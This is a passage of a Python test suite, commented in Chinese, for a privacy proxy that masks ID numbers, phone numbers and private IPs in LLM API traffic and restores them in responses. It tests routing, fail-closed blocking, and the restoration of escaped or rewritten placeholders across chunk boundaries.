        w = (7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2)
        code = "10X98765432"
        s17 = "110105" + "19900101" + "001"
        chk = code[sum(int(d) * wi for d, wi in zip(s17, w)) % 11]
        id18 = s17 + chk
        # 构造合法 15 位证（北京 1980-01-01）
        id15 = "110105" + "800101" + "001"
        self.assertTrue(tr._idcard_ok(id18))
        self.assertTrue(tr._idcard_ok(id15))
        # _idcard_ok 对非 15/18 长度返回 False
        self.assertFalse(tr._idcard_ok(id18[:17]))
        self.assertFalse(tr._idcard_ok(id15 + "0"))

        old = tr.BUILTIN_RULES.get("IDCARD")
        try:
            # 开关开：两种位数都脱敏，且都用 {{IDCARD_ 前缀
            tr.BUILTIN_RULES["IDCARD"] = True
            tr._new_session("id-merge-on")
            masked = tr.mask(f"证号 {id18} 和 {id15}", "id-merge-on")
            self.assertNotIn(id18, masked)
            self.assertNotIn(id15, masked)
            self.assertEqual(masked.count("{{IDCARD_"), 2)
            self.assertNotIn("{{IDCARD18_", masked)
            # 开关关：两种位数都不脱敏
            tr.BUILTIN_RULES["IDCARD"] = False
            tr._new_session("id-merge-off")
            masked2 = tr.mask(f"证号 {id18} 和 {id15}", "id-merge-off")
            self.assertIn(id18, masked2)
            self.assertIn(id15, masked2)
        finally:
            tr.BUILTIN_RULES["IDCARD"] = old

    def test_idcard18_legacy_config_merge(self):
        """旧配置 IDCARD18 键一次性迁移合并到 IDCARD（panel.normalize_config）。"""
        raw = {
            "builtin_rules": {
                "IDCARD": True,
                "IDCARD18": False,   # 用户明确关过 18 位证：合并后 IDCARD 应为 False
                "PHONE": True,
            }
        }
        cfg = panel.normalize_config(raw)
        br = cfg["builtin_rules"]
        self.assertNotIn("IDCARD18", br, "IDCARD18 键应被淘汰")
        self.assertFalse(br["IDCARD"], "IDCARD18=False 必须胜出（不能被旧 IDCARD=True 覆盖）")
        # 无 IDCARD18 键时不触发迁移，IDCARD 原样保留
        raw2 = {"builtin_rules": {"IDCARD": False, "PHONE": True}}
        cfg2 = panel.normalize_config(raw2)
        self.assertFalse(cfg2["builtin_rules"]["IDCARD"])
        # 默认配置里只剩 IDCARD
        self.assertIn("IDCARD", sd.DEFAULT_BUILTIN_RULES)
        self.assertNotIn("IDCARD18", sd.DEFAULT_BUILTIN_RULES)

class ReverseRoutingQueryAndCompatTests(unittest.TestCase):
    def test_apply_reverse_routing_preserves_query_params(self):
        """反代模式下必须完整保留客户端请求中的 Query 参数，且正确合并 Target 自带的 Query。"""
        # 1. 多端口模式
        tr.UPSTREAMS = [{
            "name": "azure", "port": 18701, "base_path": "/azure",
            "target": "https://resource.openai.azure.com/openai/deployments/gpt4?api-version=2024-02-15",
            "paths": ["/v1/chat/completions"],
        }]
        req = SimpleNamespace(
            method="POST", path="/chat/completions?stream=true&user=test", host="127.0.0.1",
            port=18701, scheme="http", headers={"Host": "127.0.0.1:18701"},
        )
        flow = SimpleNamespace(request=req, client_conn=SimpleNamespace(sockname=("127.0.0.1", 18701)))
        up, final = tr.apply_reverse_routing(flow)
        self.assertIsNotNone(up)
        self.assertIn("api-version=2024-02-15", flow.request.path)
        self.assertIn("stream=true", flow.request.path)
        self.assertIn("user=test", flow.request.path)
        self.assertEqual(flow.request.host, "resource.openai.azure.com")

        # 2. 单端口前缀模式
        tr.UPSTREAMS = [{
            "name": "openai", "port": 18702, "base_path": "/openai",
            "target": "https://api.openai.com/v1",
            "paths": ["/v1/chat/completions"],
        }]
        req2 = SimpleNamespace(
            method="POST", path="/openai/chat/completions?model=gpt-4o", host="127.0.0.1",
            port=5802, scheme="http", headers={"Host": "127.0.0.1:5802"},
        )
        flow2 = SimpleNamespace(request=req2, client_conn=SimpleNamespace(sockname=("127.0.0.1", 5802)))
        up2, final2 = tr.apply_reverse_routing(flow2)
        self.assertIsNotNone(up2)
        self.assertEqual(flow2.request.path, "/v1/chat/completions?model=gpt-4o")

    def test_case_insensitive_content_type_json(self):
        """Content-Type 为 Application/JSON 大小写混合时不可被误判为 non_json_body 503 阻断。"""
        tr.UPSTREAMS = [{
            "name": "test-up", "port": 18701, "base_path": "/test-up",
            "target": "https://api.openai.com/v1",
            "paths": ["/v1/chat/completions"],
        }]
        payload = json.dumps({"messages": [{"role": "user", "content": "hello"}]}).encode()
        req = SimpleNamespace(
            method="POST", path="/chat/completions", host="127.0.0.1",
            port=18701, scheme="http", headers={"content-type": "Application/JSON; charset=utf-8"},
            content=payload, text=payload.decode(), pretty_host="127.0.0.1", pretty_url="",
        )
        flow = SimpleNamespace(request=req, response=None, metadata={},
                               client_conn=SimpleNamespace(sockname=("127.0.0.1", 18701)),
                               server_conn=SimpleNamespace(via=None))
        old_emit, old_reload = tr._emit, tr._maybe_reload
        try:
            tr._emit = lambda *a, **k: None
            tr._maybe_reload = lambda force=False: None
            tr.request(flow)
        finally:
            tr._emit, tr._maybe_reload = old_emit, old_reload
        # 只要没有被 503 阻断，说明成功通过 Content-Type 检查
        if flow.response is not None:
            self.assertNotEqual(flow.response.status_code, 503, "Application/JSON 绝不可被 503 阻断")

    def test_unlisted_path_blocked_under_fail_closed(self):
        """P1 隐私旁路防御：在 FAIL_CLOSED 下，反代端口未列入白名单的非只读请求（如 multipart/audio）必须被 503 阻断。"""
        tr.UPSTREAMS = [{
            "name": "openai-test", "port": 18701, "base_path": "/openai",
            "target": "https://api.openai.com/v1",
            "paths": ["/v1/chat/completions"],
        }]
        req = SimpleNamespace(
            method="POST", path="/v1/audio/transcriptions", host="127.0.0.1",
            port=18701, scheme="http", headers={"content-type": "multipart/form-data; boundary=xyz"},
            content=b"--xyz\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\nfakeaudio\r\n--xyz--",
            text="", pretty_host="127.0.0.1", pretty_url="",
        )
        flow = SimpleNamespace(request=req, response=None, metadata={},
                               client_conn=SimpleNamespace(sockname=("127.0.0.1", 18701)),
                               server_conn=SimpleNamespace(via=None))
        old_emit, old_reload, old_fc = tr._emit, tr._maybe_reload, tr.FAIL_CLOSED
        try:
            tr._emit = lambda *a, **k: None
            tr._maybe_reload = lambda force=False: None
            tr.FAIL_CLOSED = True
            tr.request(flow)
        finally:
            tr._emit, tr._maybe_reload, tr.FAIL_CLOSED = old_emit, old_reload, old_fc
        self.assertIsNotNone(flow.response, "未配置路径的 POST 请求必须被拦截，绝不能静默透传放行")
        self.assertEqual(flow.response.status_code, 503, "FAIL_CLOSED 下必须返回 503 阻断")




class EscapedAndRewrittenPlaceholderTests(_RuleTestBase):
    """转义残渣与标签改写（2026-09-11 实测后加固）。

    两个真实故障：

    1. **转义残渣**。模型把 `{{ }}` 当模板语法/需要转义的字符，输出
       `\\{\\{X\\}\\}`。原有宽松兜底只吃得到中间一段，替换完留下 `\\{\\` 与
       `\\}\\}` 残渣 —— IP 是出来了，但命令仍然是坏的。用户看到真值出现会判断成
       「还原成功」，比彻底不还原更危险。这是本次加固的头号目标。
    2. **标签被改写**。模型自己把 `IPPRIVATE` 补成 `IP_PRIVATE`、或整段小写
       `ipprivate`。按完整 token 查表必然落空，而 6 位后缀是随机指纹、模型改不动，
       所以按后缀反查能救回来。

    后缀索引的两道门（都写死在用例里，防止日后被"顺手放宽"）：
    - 只收录纯辅音后缀：hex6 后缀在代码里太常见，进索引会误替换；
    - 只在带花括号的形态上用：裸 token 可能是被 chunk 切开的残片。
    """

    IP = "192.168.1.100"
    BS = "\\"

    def _mint(self, sid="esc"):
        tr._new_session(sid)
        masked = tr.mask(f"内网主机 {self.IP}", sid)
        m = re.search(tr._PLACEHOLDER_RX, masked)
        self.assertIsNotNone(m, f"样本必须真的被脱敏：{masked!r}")
        tok = m.group(0)
        suffix = tr._PLACEHOLDER_PARTS_RX.match(tok).group(2)
        return sid, tok, suffix

    def _restore(self, sid, text, escape=False):
        s = tr.sessions[sid]
        s["restored"] = s["degraded"] = s["unresolved"] = 0
        return tr.restore_final(text, sid, escape=escape), s

    # ---------- 一、转义残渣 ----------

    def test_escaped_braces_leave_no_residue(self):
        """核心回归：`\\{\\{X\\}\\}` 必须整块替换干净，一个反斜杠都不许剩。"""
        sid, tok, _ = self._mint()
        body = tok[2:-2]
        text = "ssh root@" + self.BS + "{" + self.BS + "{" + body + self.BS + "}" + self.BS + "}"
        out, s = self._restore(sid, text)
        self.assertEqual(out, f"ssh root@{self.IP}", "转义形态必须还原成干净命令")
        self.assertNotIn(self.BS, out, "不许留下任何反斜杠残渣")
        self.assertNotIn("{", out, "不许留下花括号残渣")
        self.assertEqual(s["degraded"], 1, "靠转义兜底修回来的必须计数")

    def test_double_escaped_braces_leave_no_residue(self):
        """二次转义（模型按 JSON 规则思考时会写成 `\\\\{\\\\{`）同样要清干净。"""
        sid, tok, _ = self._mint("esc2")
        body = tok[2:-2]
        two = self.BS * 2
        text = "ssh root@" + two + "{" + two + "{" + body + two + "}" + two + "}"
        out, _ = self._restore(sid, text)
        self.assertEqual(out, f"ssh root@{self.IP}")
        self.assertNotIn(self.BS, out)

    def test_escaped_form_in_tool_args_stays_valid_json(self):
        """tool 参数槽位（escape=True）还原后必须仍是合法 JSON。"""
        sid, tok, _ = self._mint("esc-json")
        body = tok[2:-2]
        text = ('{"cmd": "ssh root@' + self.BS + "{" + self.BS + "{" + body
                + self.BS + "}" + self.BS + "}" + '"}')
        out, _ = self._restore(sid, text, escape=True)
        self.assertEqual(json.loads(out)["cmd"], f"ssh root@{self.IP}",
                         "还原后的 JSON 必须可解析且值正确")

    def test_escaped_unknown_token_is_untouched(self):
        """没签发过的 token 即使带转义也一律原样放过——这是不误伤的唯一保证。"""
        tr._new_session("esc-fp")
        for text in [r"值 \{\{FAKE_abcdef\}\}", r"值 \{\{PHONE_a1b2c3\}\}",
                     r"正则 \{2,3\} 与 \{a\}", r"路径 C:/dir/file.txt"]:
            with self.subTest(text=text):
                self.assertEqual(tr.restore_final(text, "esc-fp"), text)

    def test_wellformed_placeholder_after_backslash_keeps_the_backslash(self):
        """已知代价的边界：标签完好时走严格遍，反斜杠不会被吃掉。

        转义遍允许反斜杠紧贴占位符（必须如此，否则 `\\{\\{` 清不干净），代价是
        「反斜杠 + 标签被改写的占位符」会少一个 `\\`。标签完好的常规形态由严格遍
        先处理，走不到转义遍，所以这条锁住「常规形态不受影响」。
        """
        sid, tok, _ = self._mint("esc-path")
        out, _ = self._restore(sid, "C:" + self.BS + "dir" + self.BS + tok)
        self.assertEqual(out, "C:" + self.BS + "dir" + self.BS + self.IP)

    def test_all_forms_survive_every_chunk_boundary(self):
        """把响应在**每一个**可能的位置切成两块，拼起来都必须还原干净。

        流式接管下 chunk 边界是随机的，只在「完整响应」上断言等于没测边界。
        加固前实测：转义形态 32 个切点里有 23 个会漏出 `\\{\\` 残渣（因为第一个
        chunk 只扣下了 `{`、反斜杠已经发出去了），所以 _PARTIAL_RX 才要把反斜杠
        一起纳入缓冲。这条用例把那批切点锁进 CI。
        """
        sid, tok, _ = self._mint("esc-cut")
        body = tok[2:-2]
        lower = body.lower()
        forms = {
            "严格": tok,
            "单反斜杠": self.BS + "{" + self.BS + "{" + body + self.BS + "}" + self.BS + "}",
            "双反斜杠": (self.BS * 2 + "{" + self.BS * 2 + "{" + body
                         + self.BS * 2 + "}" + self.BS * 2 + "}"),
            "三反斜杠": (self.BS * 3 + "{" + self.BS * 3 + "{" + body
                         + self.BS * 3 + "}" + self.BS * 3 + "}"),
            "标签小写": f"{{{{{lower}}}}}",
        }
        for name, frag in forms.items():
            expected = "ssh root@" + self.IP
            text = "ssh root@" + frag
            for i in range(1, len(text)):
                with self.subTest(形态=name, 切点=i):
                    tr.sessions[sid]["pending"].clear()
                    head = tr.restore(text[:i], sid)
                    tail = tr.restore(text[i:], sid, final=True)
                    self.assertEqual(head + tail, expected,
                                     f"{name} 在切点 {i} 漏了残渣（前缀 {text[:i]!r}）")
            # 收尾：同一形态整包还原也必须干净
            self.assertEqual(self._restore(sid, text)[0], expected, f"{name} 整包还原失败")

    def test_backslash_ending_chunk_is_delayed_not_dropped(self):
        """已知代价的边界：行尾裸反斜杠会被多扣一个 chunk，但内容不许丢。

        `\\+$` 分支是为了「切点正好落在反斜杠与花括号之间」才加的；代价是普通
        文本里以反斜杠结尾的 chunk（Windows 路径、行继续符）也会被扣住。这里锁住
        「只是晚一个 chunk，不是丢字符」。
        """
        sid, _tok, _ = self._mint("esc-backslash-tail")
        first = "路径 C:" + self.BS + "Users" + self.BS
        head = tr.restore(first, sid)
        self.assertEqual(head, "路径 C:" + self.BS + "Users", "行尾反斜杠应被扣住")
        tail = tr.restore("me" + self.BS + "file.txt", sid, final=True)
        self.assertEqual(head + tail, first + "me" + self.BS + "file.txt",
                         "扣住的内容必须原样补回")

    # ---------- 二、标签改写 ----------

    def test_underscore_inserted_by_model_still_restores(self):
        """模型自己把 `IPPRIVATE` 补回 `IP_PRIVATE`（真实改写形态）。"""
        sid, tok, suffix = self._mint("esc-underscore")
        label = tok[2:-2].rsplit("_", 1)[0]
        # 在第 2 个字符后插一个下划线：IPPRIVATE -> IP_PRIVATE（模型最典型的改写）
        underscored = label[:2] + "_" + label[2:]
        out, s = self._restore(sid, f"ssh root@{{{{{underscored}_{suffix}}}}}")
        self.assertEqual(out, f"ssh root@{self.IP}")
        self.assertEqual(s["degraded"], 1)
        self.assertEqual(s["unresolved"], 0, "救回来了就不该再计 unresolved")

    def test_lowercased_label_still_restores(self):
        """整段小写的标签（严格正则的字符类是大写，只能靠转义遍 + 后缀索引）。"""
        sid, tok, _ = self._mint("esc-lower")
        out, s = self._restore(sid, f"ssh root@{{{{{tok[2:-2].lower()}}}}}")
        self.assertEqual(out, f"ssh root@{self.IP}")
        self.assertEqual(s["degraded"], 1)

    def test_renamed_label_is_refused_not_guessed(self):
        """标签被整段换名时必须**拒答**，不能只看后缀就把值填进去。

        后缀虽然只有 47M 分之一的碰撞概率，但一旦碰撞就是静默替换错值
        （把 A 的内网 IP 填到 B 的位置）。拒答的代价只是这次没救回来，用户能看见
        裸占位符、命令失败得明明白白。宁可失败可见，不可静默替换。
        """
        sid, _tok, suffix = self._mint("esc-rename")
        text = f"ssh root@{{{{HOST_{suffix}}}}}"
        out, s = self._restore(sid, text)
        self.assertEqual(out, text, "换名标签必须原样保留")
        self.assertEqual(s["restored"], 0)
        self.assertEqual(s["unresolved"], 1, "没还原的必须计入 unresolved")

    def test_exact_token_is_not_counted_degraded(self):
        """完好占位符走精确路径，不许被计成 degraded（计数器不能被污染）。"""
        sid, tok, _ = self._mint("esc-exact")
        out, s = self._restore(sid, f"主机 {tok}")
        self.assertEqual(out, f"主机 {self.IP}")
        self.assertEqual(s["degraded"], 0)
        self.assertEqual(s["restored"], 1)

    def test_escaped_restore_is_recorded_in_restored_tokens(self):
        """转义形态救回来的必须记进 restored_tokens，且记**真实 token**。

        RESTORE 明细按签发时的 token 比对 `restored` 标记（_emit_restore_summary），
        这里若记成模型改写后的形态、或干脆不记，该项就被误标成「未还原」——
        与「degraded 从来没发出去过」是同一类假阴性。
        """
        sid, tok, suffix = self._mint("esc-book")
        s = tr.sessions[sid]
        # (a) 标签完好的转义形态：canon 与签发 token 相同
        body = tok[2:-2]
        self._restore(sid, "A " + self.BS + "{" + self.BS + "{" + body
                      + self.BS + "}" + self.BS + "}")
        self.assertIn(tok, s["restored_tokens"])
        # (b) 标签被改写的形态：必须记真实 token，而不是改写后的 canon
        label = body.rsplit("_", 1)[0]
        underscored = label[:2] + "_" + label[2:]
        rewritten = f"{{{{{underscored}_{suffix}}}}}"
        s["restored_tokens"].clear()
        self._restore(sid, "B " + rewritten)
        self.assertIn(tok, s["restored_tokens"], "记账必须是签发时的真实 token")
        self.assertNotIn(rewritten, s["restored_tokens"], "不许记模型改写后的形态")

    # ---------- 三、后缀索引的两道门 ----------

    def test_brace_less_fragment_is_never_substituted(self):
        """门二：裸 token 不走后缀索引。

        流式响应里裸 token 会被 chunk 切开，残片（实测 `ATE_zwndfk`）能被宽松
        正则命中；后缀索引一旦介入就会把残片替换成明文，拼出一条错的命令。
        """
        sid, tok, suffix = self._mint("esc-frag")
        for frag in (f"IPPRIV ATE_{suffix}", f"HOST_{suffix}", f"ATE_{suffix}"):
            with self.subTest(frag=frag):
                out, _ = self._restore(sid, frag)
                self.assertEqual(out, frag, "裸残片一律不许替换")
        # 对照：同一后缀带上完整花括号就走得到后缀索引
        self.assertEqual(self._restore(sid, f"{{{{IPPRIVATE_{suffix}}}}}")[0], self.IP)

    def test_hex_suffix_is_never_indexed(self):
        """门一：hex6 后缀不进索引。

        `config_abc123` / `sha_abcdef` 这类「小写标识符 + _hex6」在代码里很常见，
        进索引就会把整段替换成明文，直接改坏用户代码。
        """
        legacy = "{{PHONE_a1b2c3}}"
        tr._RECENT_FWD["13800138000"] = [legacy, "PHONE", time.time()]
        tr._RECENT_REV[legacy] = ["13800138000", "PHONE", time.time()]
        tr._suffix_index_add(legacy)
        self.assertNotIn("a1b2c3", tr._RECENT_SUFFIX, "hex 后缀不许进索引")
        # 即使标签被改写，也不能靠 hex 后缀反查到
        tr._new_session("hex-gate")
        self.assertIsNone(tr._lookup_by_suffix("{{FAKE_a1b2c3}}", "hex-gate"))
        self.assertEqual(tr.restore_final("{{FAKE_a1b2c3}}", "hex-gate"), "{{FAKE_a1b2c3}}")

    def test_suffix_collision_blocks_both_tokens(self):
        """后缀撞车时两边都拒答，绝不能「保留先来的那个」。

        保留其一 = 把 A 的原文答给 B。新 token 由 _new_token 保证后缀唯一，撞车
        只可能来自预热的历史数据，但答错值的后果一样严重。
        """
        sid, tok, suffix = self._mint("esc-collide")
        other = f"{{{{PHONE_{suffix}}}}}"
        tr._suffix_index_add(other)
        self.assertIs(tr._RECENT_SUFFIX[suffix], tr._SUFFIX_AMBIGUOUS, "撞车后必须置为不可用")
        self.assertIsNone(tr._lookup_by_suffix(tok, sid))
        self.assertIsNone(tr._lookup_by_suffix(other, sid))
        # 精确路径不受影响：A 自己的原文照常还原
        self.assertEqual(tr.restore_final(f"主机 {tok}", sid), f"主机 {self.IP}")

    def test_replayed_suffix_registration_is_not_a_collision(self):
        """同一 token 被登记两次不是撞车（issue #27）。

        预热走 json.loads、客户端历史走 sqlite，拿到的 token 与索引里已存的那个
        **值相等但对象不同**。用 `is not` 比较会把「同一 token 第二次登记」误判成
        撞车：后缀被永久置为 _SUFFIX_AMBIGUOUS，且运行时补登记救不回来（object()
        与任何字符串都不相等）。后果是「按后缀反查」这条兜底静默退出，模型改写
        标签/大小写的占位符再也还原不出来，用户只看到裸占位符、没有任何日志。

        预热里同一 token 出现 >=2 条事件是常态（复用表的设计目的就是跨请求复用），
        所以这条路径在实际使用中必然被踩到。
        """
        sid, tok, suffix = self._mint("esc-replay")
        # 模拟 _warmup_from_events 第 2 条事件：值是同一个 token，对象是 json.loads 新造的
        tr._suffix_index_add(json.loads(json.dumps(tok)))
        self.assertEqual(tr._RECENT_SUFFIX[suffix], tok, "重放同一 token 不许被判成撞车")
        # 兜底仍然可用：标签补回下划线 / 整段小写都能救回来
        self.assertEqual(tr._lookup_by_suffix(f"{{{{IP_PRIVATE_{suffix}}}}}", sid), self.IP)
        self.assertEqual(self._restore(sid, f"主机 {{{{ipprivate_{suffix}}}}}")[0],
                         f"主机 {self.IP}")

    def test_replayed_registration_survives_warmup_replay_loop(self):
        """预热整轮重放（同一 token 反复登记）后兜底依然可用。

        _warmup_from_events 逐条 json.loads 事件，复用命中越多、同一 token 被重放
        的次数越多。重放 N 次都必须保持「指向该 token」，而不是退化成撞车。
        """
        sid, tok, suffix = self._mint("esc-replay-loop")
        for _ in range(5):
            tr._suffix_index_add(json.loads(json.dumps(tok)))
        self.assertEqual(tr._RECENT_SUFFIX[suffix], tok)
        self.assertEqual(self._restore(sid, f"主机 {{{{IP_PRIVATE_{suffix}}}}}")[0],
                         f"主机 {self.IP}")

    def test_new_tokens_keep_suffixes_unique(self):
        """连续签发不产生重复后缀，索引条数与复用表条数一致。"""
        tr._new_session("esc-uniq")
        toks = [tr._recall_token(f"10.0.0.{i}", "IP_PRIVATE") for i in range(300)]
        sufs = [tr._PLACEHOLDER_PARTS_RX.match(t).group(2) for t in toks]
        self.assertEqual(len(set(toks)), 300)
        self.assertEqual(len(set(sufs)), 300, "后缀必须唯一，否则索引会产生歧义")
        self.assertEqual(len(tr._RECENT_SUFFIX), 300)

    def test_suffix_index_is_pruned_with_recent_tables(self):
        """索引必须跟着复用表一起淘汰，否则 _new_token 会白白避开空出来的后缀。"""
        tr._new_session("esc-prune")
        tok = tr._recall_token("10.9.9.9", "IP_PRIVATE")
        suffix = tr._PLACEHOLDER_PARTS_RX.match(tok).group(2)
        self.assertIn(suffix, tr._RECENT_SUFFIX)
        tr._RECENT_FWD["10.9.9.9"][2] = time.time() - 10 * 86400  # 造过期
        tr._prune_recent()
        self.assertNotIn(suffix, tr._RECENT_SUFFIX)
        self.assertNotIn(tok, tr._RECENT_REV)
